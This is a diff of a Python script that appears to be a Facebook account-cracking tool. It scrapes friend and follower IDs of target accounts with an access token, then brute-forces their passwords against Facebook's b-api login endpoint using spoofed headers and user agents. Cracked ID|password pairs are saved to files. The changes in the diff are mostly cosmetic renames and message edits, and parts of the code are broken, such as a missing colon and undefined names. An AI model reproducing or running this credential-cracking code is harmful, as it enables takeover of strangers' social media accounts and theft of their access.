@@ -106,7 +106,7 @@ def login():
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
-			exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mLogin Error\033[1;97m")
+			exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m")
 
 # Menu Raka Andrian Tara
 def menu():
@@ -116,14 +116,14 @@ def menu():
 		token = open("login.txt","r").read()
 	except KeyError:
 		os.system("rm -f login.txt")
-		exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mLogin Error\033[1;97m")
+		exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m")
 	try:
 		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 	except IOError:
 		os.system("rm -f login.txt")
 		exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m...")
 	except requests.exceptions.ConnectionError:
-		exit(" ! no internet connection")
+		exit("\033[1;97m[\033[1;92m•\033[1;97m] No Internet Connection...!")
 
 # Logo (LO GADA OTAK)
 	logo()
@@ -140,28 +140,28 @@ def menu():
 	print("\033[1;96m[\033[1;93m5\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m User-Agent Settings \033[1;97m [ \033[1;95mPro \033[1;97m]")
 	print("\033[1;96m[\033[1;93m6\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;91m Remove-Token")
 	print("\033[1;96m[\033[1;93m0\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Exit\n")		
-	Bilal = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Option : \033[1;92m")
-	if Bilal =="":
+	Raka = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Option : \033[1;92m")
+	if Raka =="":
 		menu()
-	elif Bilal == "1" or Bilal == "01":
+	elif Raka == "1" or Raka == "01":
 		publik()
 		method()
-	elif Bilal == "2" or Bilal == "02":
+	elif Raka == "2" or Raka == "02":
 		follower()
 		method()
-	elif Bilal == "3" or Bilal == "03":
+	elif Raka == "3" or Raka == "03":
 		massal()
 		method()
-	elif Bilal == "4" or Bilal == "04":
+	elif Raka == "4" or Raka == "04":
 		print(" ")
 		print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check Results RAKA_AMANDA OK")
 		print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check Results RAKA_AMANDA CP")
 		print(" ")
-        elif Bilal == "6" or Bilal == "06":
+        elif Raka == "6" or Raka == "06":
                 jalan('\033[1;97m[\033[1;92m•\033[1;97m] Delete Token....');time.sleep(1)
 		os.system('rm -rf login_r.txt')
 		login()
-        elif Bilal == "0"
+        elif Raka == "0"
                 jalan('\033[1;97m[\033[1;92m•\033[1;97m] Please Come Back...');time.sleep(1)
 		os.system('exit')
 		cek = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Option  : \033[1;92m")
@@ -171,7 +171,7 @@ def menu():
 			dirs = os.listdir("OK")
 			print("\033[1;96m[\033[1;93m•\033[1;96m] Copy File Name  And Past Into Input")
 			for file in dirs:
-				print("[®]  "+file)
+				print("[•]  "+file)
 			try:
 				file = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m] File Name : ")
 				if file == "":
@@ -212,15 +212,15 @@ def publik():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Error")
-	idt = raw_input("\033[1;97m[\033[1;92m•\033[1;97m]\033[1;97m Target Id      : \033[1;92m")
+		exit("\n\033[1;97m[\033[1;92m•\033[1;97m] Token Expired")
+	idt = raw_input("\033[1;97m[\033[1;92m•\033[1;97m] Target Id      : \033[1;92m")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\033[1;93m◍➤\033[1;97m Account Friend List Is Not Public")
+		exit("\033[1;93m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
 	print("[\033[1;93m•\033[1;97m] Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def follower():
@@ -236,7 +236,7 @@ def follower():
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\033[1;93m◍➤\033[1;97m Account Friend List Is Not Public")
+		exit("\033[1;93m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
 	print("[\033[1;93m•\033[1;97m] Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def massal():
@@ -246,26 +246,26 @@ def massal():
 	except IOError:
 		exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m")
 	try:
-		tanya_Total = int(input("\033[1;93m◍➤\033[1;97m Enter Multiple ID Option : "))
+		tanya_Total = int(input("\033[1;93m⋆✥⋆➣\033[1;97m Enter Multiple ID Option : "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id %s     : "%(t))
+		idt = raw_input("\033[1;93m⋆✥⋆➣\033[1;97m Target Id %s     : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
 				nama = n["name"].rsplit(" ")[0]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			print("\033[1;93m◍➤\033[1;97m Account Friend List Is Not Public")
+			print("\033[1;93m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
 	print("[\033[1;93m•\033[1;97m] Total id    : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
-	print("[\033[1;93m•\033[1;97m] Choose Crack Methode [ \033[1;92mRecommended M-Basic \033[1;97m]")
+	print("[\033[1;92m•\033[1;97m] Choose Crack Methode [ \033[1;92mRecommended M-Basic \033[1;97m]")
 	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mB-API\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mM-Basic\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mFree Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]\n")
-	method = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mOption : \033[1;92m")
+	method = raw_input("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;92m⋆✥⋆➣ \033[1;97mOption : \033[1;92m")
 	if method == "":
 		menu()
 	elif method == "1":
@@ -344,7 +344,7 @@ def bapi(user):
 			ses = requests.Session()
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
-			if "session_key" in send.text and "EAAG" in send.text:
+			if "session_key" in send.text and "EAAA" in send.text:
 				print("\r\033[0;92m[RAKA_AMANDA] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
@@ -476,11 +476,11 @@ def manual():
                 ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
                 ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
-	print("\n[+] Type , For 2nd Password For Example : 112233,334455,445566,223344 etc")
+	print("\n[•] Type , For 2nd Password For Example : 112233,334455,445566,223344 etc")
 	asu = raw_input("[•] Enter Passwords : ").split(",")
 	if len(asu) =="":
 		exit("[•] Wrong Input")
-	print("[+] Enter 2-4 Passwords For Fast Cracking Speed\n")
+	print("[•] Enter 2-4 Passwords For Fast Cracking Speed\n")
 
 	def main(user):
 		global loop, token
@@ -541,7 +541,7 @@ def setting_ua():
 		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 		os.system("rm -f .ua")
 		time.sleep(1)
-		raw_input("\n[®] User-Agent Save Successfully")
+		raw_input("\n[•] User-Agent Save Successfully")
 		menu()
 
 def raka_andrian():
